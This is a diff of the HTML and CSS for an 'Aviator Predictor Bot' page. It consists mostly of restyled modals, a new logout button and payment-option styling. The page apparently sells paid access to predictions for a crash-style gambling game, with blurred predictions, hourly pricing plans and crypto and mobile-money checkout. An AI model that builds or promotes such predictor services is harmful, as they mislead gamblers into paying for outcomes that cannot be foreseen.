@@ -5,1339 +5,123 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aviator Predictor Bot</title>
     <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="botstyles.css">
     <style>
-        body.bot-dark {
-            background: #181a20;
-            color: #fff;
-            min-height: 100vh;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI', Arial, sans-serif;
-        }
-        body.bot-server-mode {
-            background: radial-gradient(ellipse at center, #3b3f52 0%, #1d1f29 55%, #0b0d12 100%);
-            color: #fff;
-            min-height: 100vh;
-            margin: 0;
-            font-family: 'Segoe UI', Arial, sans-serif;
-        }
-        .bot-server {
-            background: radial-gradient(ellipse at center, #2c2d35 0%, #1a1b21 50%, #0f1014 100%);
-            color: #fff;
-            min-height: 100vh;
-            width: 100vw;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            padding-top: 48px;
-        }
-        .site-tiles {
-            display: flex;
-            gap: 24px;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-top: 24px;
-        }
-        .site-tile {
-            background: #22232a;
-            border: 2px solid #e74c3c;
-            border-radius: 12px;
-            padding: 16px;
-            color: #fff;
-            font-size: 0.9em;
+        .payment-option {
             cursor: pointer;
-            transition: box-shadow 0.2s, border 0.2s;
-            min-width: 100px;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-        }
-        .site-tile.selected, .site-tile:hover {
-            box-shadow: 0 0 16px #e74c3c88;
-            border: 2px solid #f1c40f;
-        }
-        .site-tile img {
-            height: 32px;
-            width: auto;
-            border-radius: 4px;
-        }
-        /* Image tile buttons styling */
-        .site-options { display:flex; flex-wrap:wrap; gap:12px; justify-content:center; margin-top:8px; }
-        .site-btn { 
-            background:#22232a; border:2px solid #e74c3c; color:#fff; border-radius:12px; 
-            padding:10px 12px; cursor:pointer; display:inline-flex; align-items:center; gap:8px;
-            transition: box-shadow .2s, border .2s; font-size:.95em;
-        }
-        .site-btn:hover, .site-btn.selected { border-color:#f1c40f; box-shadow:0 0 14px #e74c3c88; }
-        .site-btn img { height:32px; width:auto; border-radius:4px; }
-        .bot-center {
-            text-align: center;
-            max-width: 400px;
-            margin: auto;
-            background: rgba(30,32,40,0.95);
-            border-radius: 16px;
-            box-shadow: 0 4px 32px #000a;
-            padding: 32px 24px;
-        }
-        /* Header + layout after login */
-        .bot-header {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 18px;
-            background: rgba(0,0,0,0.25);
-            backdrop-filter: blur(6px);
-            border-bottom: 1px solid rgba(255,255,255,0.08);
-            position: sticky;
-            top: 0;
-            z-index: 5;
-        }
-        .brand {
-            font-weight: 700; letter-spacing: .5px;
-        }
-        .user-badge { display:flex; align-items:center; gap:10px; }
-        .user-avatar { width:36px; height:36px; border-radius:50%; background:#e74c3c; display:flex; align-items:center; justify-content:center; font-weight:700; }
-        .user-contact { font-size:.95em; opacity:.95; }
-        .bot-container { width:100%; max-width: 980px; padding: 24px; }
-        .card { background: rgba(20,22,28,0.7); border: 1px solid rgba(255,255,255,0.08); border-radius:12px; padding:16px; }
-        .bot-instructions { margin-top: 20px; }
-        .bot-instructions h3 { margin: 0 0 8px; }
-        .bot-instructions ol { margin: 8px 0 0 18px; line-height:1.6; }
-        /* Footer */
-        .bot-footer { width:100%; padding: 18px; text-align:center; opacity:.9; border-top:1px solid rgba(255,255,255,0.08); margin-top: 28px; }
-        .bot-footer a { color:#f1c40f; text-decoration:none; }
-        .hidden { display: none; }
-        
-        /* Modal Base Styles */
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            backdrop-filter: blur(4px);
-        }
-        
-        .modal-content {
-            background: linear-gradient(135deg, #2c2d35 0%, #1a1b21 50%, #0f1014 100%);
-            border: 2px solid #e74c3c;
-            border-radius: 16px;
-            padding: 30px;
-            color: #fff;
-            box-shadow: 0 0 50px rgba(231, 76, 60, 0.3);
-            position: relative;
-            animation: modalSlideIn 0.3s ease-out;
-            max-height: 90vh;
-            overflow-y: auto;
-            width: 90%;
-            max-width: 450px;
-        }
-        
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        
-        .bot-plane {
-            font-size: 64px;
-            color: #e74c3c;
-            margin-bottom: 16px;
-            animation: fly 2s infinite linear alternate;
-        }
-        @keyframes fly {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-12px); }
-        }
-        .bot-btn {
-            background: #e74c3c;
-            color: #fff;
-            border: none;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
             border-radius: 8px;
-            padding: 12px 32px;
-            font-size: 1.1em;
-            cursor: pointer;
-            margin-top: 16px;
-            transition: background 0.2s;
-        }
-        .bot-btn:hover {
-            background: #c0392b;
-        }
-        .bot-input {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 6px;
-            border: 1px solid #333;
-            background: #222;
+            padding: 15px;
+            margin: 10px 0;
+            background: #2c2d35;
             color: #fff;
-        }
-        .bot-select {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 6px;
-            border: 1px solid #333;
-            background: #222;
-            color: #fff;
-        }
-        .bot-status {
-            margin: 16px 0;
-            font-size: 1.1em;
-            color: #f1c40f;
             text-align: center;
-            padding: 20px;
-            background: rgba(20,22,28,0.9);
-            border: 1px solid #f1c40f;
-            border-radius: 12px;
-            animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        .payment-option:hover {
+            background: #3c3d45;
+            border-color: #007bff;
         }
-        .connecting-dots::after {
-            content: '';
-            animation: dots 1.5s infinite;
+        .payment-option.selected {
+            background: #007bff;
+            border-color: #0056b3;
+            color: white;
         }
-        @keyframes dots {
-            0% { content: ''; }
-            25% { content: '.'; }
-            50% { content: '..'; }
-            75% { content: '...'; }
-            100% { content: ''; }
+        .complete-payment-btn:hover {
+            background: #e55a2b !important;
+            transform: translateY(-2px);
         }
-        
-        /* Game Modal Styles */
-        .game-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0,0,0,0.95);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .game-container {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%);
-            border: 2px solid #e74c3c;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(231,76,60,0.3);
-        }
-        .plane-container {
-            margin: 30px 0;
-            position: relative;
-            height: 200px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .plane-icon {
-            font-size: 120px;
-            color: #e74c3c;
-            transform: rotate(-45deg);
-            animation: planeFloat 3s ease-in-out infinite;
-        }
-        @keyframes planeFloat {
-            0%, 100% { transform: rotate(-45deg) translateY(0); }
-            50% { transform: rotate(-45deg) translateY(-20px); }
-        }
-        .game-status {
-            font-size: 1.8em;
-            margin: 20px 0;
-            color: #f1c40f;
-            font-weight: bold;
-        }
-        .round-info {
-            background: rgba(0,0,0,0.3);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .prediction-display {
-            font-size: 2.5em;
-            color: #00ff88;
-            font-weight: bold;
-            text-shadow: 0 0 20px rgba(0,255,136,0.5);
-            margin: 15px 0;
+        .activate-bot-btn {
             transition: all 0.3s ease;
         }
-        .prediction-blurred {
-            filter: blur(3px);
-            color: #666;
-            text-shadow: none;
+        .activate-bot-btn:hover {
+            background: #218838 !important;
+            transform: translateY(-2px);
         }
-        .activation-overlay {
-            position: absolute;
+        .payment-details {
+            transition: all 0.3s ease;
+        }
+        
+        /* Modal Improvements */
+        .modal {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.8);
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            border-radius: 20px;
-            z-index: 10;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            box-sizing: border-box;
         }
-        .activation-card {
-            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
-            border: 2px solid #e74c3c;
-            border-radius: 15px;
-            padding: 30px;
-            text-align: center;
-            max-width: 400px;
-            margin: 20px;
+        .modal.hidden {
+            display: none;
         }
-        .pricing-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        .price-option {
-            background: rgba(231,76,60,0.1);
-            border: 2px solid #e74c3c;
-            border-radius: 10px;
-            padding: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
+        .modal-content {
+            background: #1a1b21;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
             position: relative;
         }
-        .price-option:hover {
-            background: rgba(231,76,60,0.2);
-            transform: scale(1.02);
-        }
-        .price-option.selected {
-            border-color: #f1c40f;
-            background: rgba(241,196,15,0.2);
-        }
-        .price-option.popular {
-            border-color: #00ff88;
-        }
-        .price-option.popular::before {
-            content: 'POPULAR';
-            position: absolute;
-            top: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #00ff88;
-            color: #000;
-            padding: 3px 8px;
-            border-radius: 10px;
-            font-size: 0.7em;
-            font-weight: bold;
-        }
-        .price-title {
-            font-weight: bold;
-            color: #f1c40f;
-            margin-bottom: 5px;
-        }
-        .price-amount {
-            font-size: 1.3em;
-            color: #00ff88;
-            margin: 5px 0;
-        }
-        .price-duration {
-            color: #ccc;
-            font-size: 0.9em;
-        }
-        .activate-btn {
-            background: linear-gradient(45deg, #e74c3c, #c0392b);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 15px 30px;
-            font-size: 1.1em;
-            cursor: pointer;
-            margin-top: 20px;
-            width: 100%;
-            transition: all 0.3s;
-        }
-        .activate-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(231,76,60,0.4);
-        }
-        .activate-btn:disabled {
-            background: #666;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .game-start-btn {
-            background: #e74c3c;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 12px 30px;
-            font-size: 1.2em;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.3s;
-        }
-        .game-start-btn:hover {
-            background: #c0392b;
-        }
-        .close-game {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: #e74c3c;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            font-size: 1.2em;
-            cursor: pointer;
-        }
-
-        /* Payment Modal Styles */
         .payment-header {
+            padding: 20px;
+            border-bottom: 1px solid #333;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #333;
         }
-
-        .payment-header h3 {
-            margin: 0;
-            color: #fff;
-            font-size: 1.4em;
+        .payment-body {
+            padding: 20px;
         }
-
         .close-payment {
-            color: #999;
             font-size: 24px;
-            font-weight: bold;
             cursor: pointer;
-            transition: color 0.3s;
+            color: #ccc;
         }
-
         .close-payment:hover {
             color: #fff;
         }
-
-        .payment-summary {
-            background: #1a1a1a;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 25px;
-            border: 1px solid #333;
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .modal {
+                padding: 10px;
+            }
+            .modal-content {
+                max-height: 95vh;
+            }
+            .payment-header, .payment-body {
+                padding: 15px;
+            }
         }
-
-        .plan-details {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #333;
-        }
-
-        .plan-name {
-            font-size: 1.1em;
-            font-weight: bold;
-            color: #fff;
-        }
-
-        .plan-price {
-            font-size: 1.5em;
-            font-weight: bold;
-            color: #00ff88;
-        }
-
-        .payment-benefits {
-            display: grid;
-            gap: 8px;
-        }
-
-        .benefit {
-            color: #ccc;
-            font-size: 0.9em;
-        }
-
-        .payment-form {
-            margin-bottom: 20px;
-        }
-
-        .payment-method {
-            margin-bottom: 20px;
-        }
-
-        .payment-method label {
-            display: block;
-            margin-bottom: 10px;
-            color: #fff;
-            font-weight: bold;
-        }
-
-        .payment-options {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-
-        .payment-option {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px;
-            background: #1a1a1a;
-            border: 2px solid #333;
-            border-radius: 8px;
+        
+        /* Logout Button Styles */
+        .logout-btn {
+            margin-left: 10px;
+            padding: 8px;
             cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .payment-option.selected {
-            border-color: #00ff88;
-            background: rgba(0, 255, 136, 0.1);
-        }
-
-        .payment-option i {
-            font-size: 1.2em;
-            color: #00ff88;
-        }
-
-        .payment-option span {
-            color: #fff;
-            font-size: 0.9em;
-        }
-
-        .payment-details {
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #ccc;
-            font-size: 0.9em;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 1em;
-            transition: border-color 0.3s;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #00ff88;
-        }
-
-        .form-row {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 15px;
-        }
-
-        .complete-payment-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #00ff88, #00cc6a);
-            color: #000;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .complete-payment-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
-        }
-
-        .complete-payment-btn:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .paypal-info {
-            text-align: center;
-            padding: 30px;
-            color: #ccc;
-        }
-
-        .payment-security {
-            text-align: center;
-            padding-top: 15px;
-            border-top: 1px solid #333;
-        }
-
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .security-badges span {
-            font-size: 0.8em;
-            color: #999;
-            background: #1a1a1a;
-            padding: 5px 10px;
-            border-radius: 15px;
-            border: 1px solid #333;
-        }
-
-        /* Crypto Payment Styles */
-        .crypto-option-selector {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .crypto-option {
-            background: #222;
-            border: 2px solid #333;
-            color: #fff;
-            padding: 12px 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.3s;
-        }
-
-        .crypto-option:hover {
-            border-color: #f1c40f;
-            background: #2a2a2a;
-        }
-
-        .crypto-option.selected {
-            border-color: #00ff88;
-            background: #1a3a1a;
-        }
-
-        .crypto-option img {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-        }
-
-        /* Mobile Money Styles */
-        #mobile-pay-btn {
-            background: linear-gradient(135deg, #28a745, #20753d);
-            transition: all 0.3s;
-        }
-
-        #mobile-pay-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
-        }
-
-        #paybill-confirm-btn {
-            background: linear-gradient(135deg, #28a745, #20753d);
-            transition: all 0.3s;
-        }
-
-        #paybill-confirm-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
-        }
-
-        /* Custom scrollbar for modal */
-        .modal-content::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .modal-content::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.1);
             border-radius: 4px;
-        }
-
-        .modal-content::-webkit-scrollbar-thumb {
-            background: #e74c3c;
-            border-radius: 4px;
-        }
-
-        .modal-content::-webkit-scrollbar-thumb:hover {
-            background: #c0392b;
-        }
-
-        /* Disable text selection and right-click context menu */
-        * {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            -webkit-touch-callout: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        /* Allow text selection only for input fields */
-        input, textarea {
-            -webkit-user-select: text;
-            -moz-user-select: text;
-            -ms-user-select: text;
-            user-select: text;
-        }
-
-        /* Support Chat Widget Styles */
-        .chat-widget {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 10000;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-
-        .chat-toggle {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            color: #ccc;
             transition: all 0.3s ease;
-            position: relative;
-            animation: pulse-chat 2s infinite;
-        }
-
-        .chat-toggle:hover {
-            transform: scale(1.1);
-            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.6);
-        }
-
-        .chat-toggle i {
-            color: white;
-            font-size: 24px;
-        }
-
-        .chat-badge {
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: #ff4757;
-            color: white;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 10px;
-            font-weight: bold;
-            animation: bounce 2s infinite;
         }
-
-        .chat-window {
-            position: absolute;
-            bottom: 80px;
-            right: 0;
-            width: 350px;
-            height: 500px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            animation: slideInUp 0.3s ease;
+        .logout-btn:hover {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff4444;
         }
-
-        .chat-header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 20px;
-            color: white;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .chat-title {
+        
+        /* User Badge Layout */
+        .user-badge {
             display: flex;
             align-items: center;
-            gap: 10px;
-        }
-
-        .chat-title span:first-of-type {
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .chat-status {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .chat-minimize {
-            background: none;
-            border: none;
-            color: white;
-            cursor: pointer;
-            padding: 5px;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-
-        .chat-minimize:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .chat-messages {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-            background: #f8f9fa;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .chat-message {
-            display: flex;
-            gap: 10px;
-            max-width: 85%;
-            animation: fadeInUp 0.3s ease;
-        }
-
-        .chat-message.user-message {
-            align-self: flex-end;
-            flex-direction: row-reverse;
-        }
-
-        .chat-message.bot-message .message-content {
-            background: white;
-            border: 1px solid #e9ecef;
-        }
-
-        .chat-message.user-message .message-content {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .message-avatar {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 14px;
-            flex-shrink: 0;
-        }
-
-        .user-message .message-avatar {
-            background: linear-gradient(135deg, #2ed573 0%, #17a2b8 100%);
-        }
-
-        .message-content {
-            border-radius: 18px;
-            padding: 12px 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        .message-text {
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 5px;
-        }
-
-        .message-time {
-            font-size: 10px;
-            opacity: 0.7;
-        }
-
-        .chat-input-container {
-            padding: 20px;
-            background: white;
-            border-top: 1px solid #e9ecef;
-        }
-
-        .chat-input-wrapper {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .chat-input-wrapper input {
-            flex: 1;
-            padding: 12px 16px;
-            border: 2px solid #e9ecef;
-            border-radius: 25px;
-            outline: none;
-            font-size: 14px;
-            transition: border-color 0.2s;
-        }
-
-        .chat-input-wrapper input:focus {
-            border-color: #667eea;
-        }
-
-        .chat-input-wrapper button {
-            width: 45px;
-            height: 45px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            border-radius: 50%;
-            color: white;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: transform 0.2s;
-        }
-
-        .chat-input-wrapper button:hover {
-            transform: scale(1.1);
-        }
-
-        .chat-quick-options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .quick-option {
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 15px;
-            padding: 6px 12px;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #495057;
-        }
-
-        .quick-option:hover {
-            background: #667eea;
-            color: white;
-            border-color: #667eea;
-        }
-
-        /* Animations */
-        @keyframes pulse-chat {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-3px); }
-        }
-
-        @keyframes slideInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Mobile responsiveness */
-        @media (max-width: 480px) {
-            .chat-window {
-                width: 90vw;
-                height: 70vh;
-                bottom: 80px;
-                right: 5vw;
-            }
-            
-            .chat-widget {
-                bottom: 15px;
-                right: 15px;
-            }
-        }
-
-        /* Chat typing indicator */
-        .typing-indicator {
-            display: flex;
-            gap: 3px;
-            padding: 12px 16px;
-        }
-
-        .typing-dot {
-            width: 6px;
-            height: 6px;
-            background: #999;
-            border-radius: 50%;
-            animation: typing 1.4s infinite ease-in-out;
-        }
-
-        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
-        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes typing {
-            0%, 60%, 100% { transform: translateY(0); }
-            30% { transform: translateY(-10px); }
-        }
-
-        /* Support Chat Widget Styles */
-        .support-chat-widget {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 10000;
-            font-family: 'Arial', sans-serif;
-        }
-
-        .chat-toggle {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.4);
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .chat-toggle:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.6);
-        }
-
-        .chat-toggle i {
-            color: white;
-            font-size: 24px;
-        }
-
-        .chat-badge {
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: #e74c3c;
-            color: white;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-        }
-
-        .chat-window {
-            position: absolute;
-            bottom: 80px;
-            right: 0;
-            width: 350px;
-            height: 500px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .chat-header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .chat-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .chat-title span {
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .online-status {
-            font-size: 12px;
-            color: #4ade80;
-            font-weight: 500;
-        }
-
-        .chat-close {
-            background: none;
-            border: none;
-            color: white;
-            cursor: pointer;
-            font-size: 18px;
-            padding: 5px;
-            border-radius: 50%;
-            transition: background 0.2s;
-        }
-
-        .chat-close:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .chat-messages {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            background: #f8fafc;
-        }
-
-        .message {
-            display: flex;
-            gap: 10px;
-        }
-
-        .message-avatar {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-
-        .bot-message .message-avatar {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .user-message .message-avatar {
-            background: #e2e8f0;
-            color: #64748b;
-            order: 1;
-        }
-
-        .user-message {
-            flex-direction: row-reverse;
-        }
-
-        .message-content {
-            flex: 1;
-            max-width: 85%;
-        }
-
-        .user-message .message-content {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-
-        .message-text {
-            background: white;
-            padding: 12px 16px;
-            border-radius: 18px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            line-height: 1.4;
-            color: #374151;
-        }
-
-        .user-message .message-text {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .message-time {
-            font-size: 11px;
-            color: #9ca3af;
-            margin-top: 5px;
-            padding-left: 16px;
-        }
-
-        .user-message .message-time {
-            padding-left: 0;
-            padding-right: 16px;
-        }
-
-        .chat-input-area {
-            border-top: 1px solid #e5e7eb;
-            background: white;
-        }
-
-        .typing-indicator {
-            padding: 10px 20px;
-            background: #f1f5f9;
-        }
-
-        .typing-dots {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #64748b;
-            font-size: 13px;
-        }
-
-        .dots {
-            display: flex;
-            gap: 3px;
-        }
-
-        .dots span {
-            width: 6px;
-            height: 6px;
-            background: #64748b;
-            border-radius: 50%;
-            animation: typing 1.4s infinite ease-in-out;
-        }
-
-        .dots span:nth-child(2) { animation-delay: 0.2s; }
-        .dots span:nth-child(3) { animation-delay: 0.4s; }
-
-        .chat-input-container {
-            display: flex;
-            padding: 15px 20px;
-            gap: 10px;
-            align-items: center;
-        }
-
-        #chat-input {
-            flex: 1;
-            border: 2px solid #e5e7eb;
-            border-radius: 25px;
-            padding: 12px 18px;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        #chat-input:focus {
-            border-color: #667eea;
-        }
-
-        #send-button {
-            width: 45px;
-            height: 45px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            border-radius: 50%;
-            color: white;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: transform 0.2s;
-        }
-
-        #send-button:hover {
-            transform: scale(1.1);
-        }
-
-        .chat-quick-options {
-            display: flex;
-            gap: 8px;
-            padding: 10px 20px 20px;
-            flex-wrap: wrap;
-        }
-
-        .quick-option {
-            background: #f1f5f9;
-            border: 1px solid #e2e8f0;
-            border-radius: 20px;
-            padding: 8px 12px;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #64748b;
-        }
-
-        .quick-option:hover {
-            background: #667eea;
-            color: white;
-            border-color: #667eea;
-        }
-
-        /* Mobile Responsive */
-        @media (max-width: 480px) {
-            .chat-window {
-                width: 320px;
-                height: 450px;
-                bottom: 70px;
-                right: -10px;
-            }
-            
-            .support-chat-widget {
-                bottom: 15px;
-                right: 15px;
-            }
         }
     </style>
 </head>
@@ -1369,6 +153,9 @@
                 <div class="user-badge">
                     <div class="user-avatar"><i class="fas fa-user"></i></div>
                     <div class="user-contact" id="userContact">User</div>
+                    <div class="logout-btn" id="logoutBtn" onclick="logoutUser()" title="Logout">
+                        <i class="fas fa-sign-out-alt"></i>
+                    </div>
                 </div>
             </header>
             <div class="bot-container">
@@ -1451,8 +238,18 @@
                                 </div>
                                 <div class="price-option" data-plan="1hour" data-price="44.99">
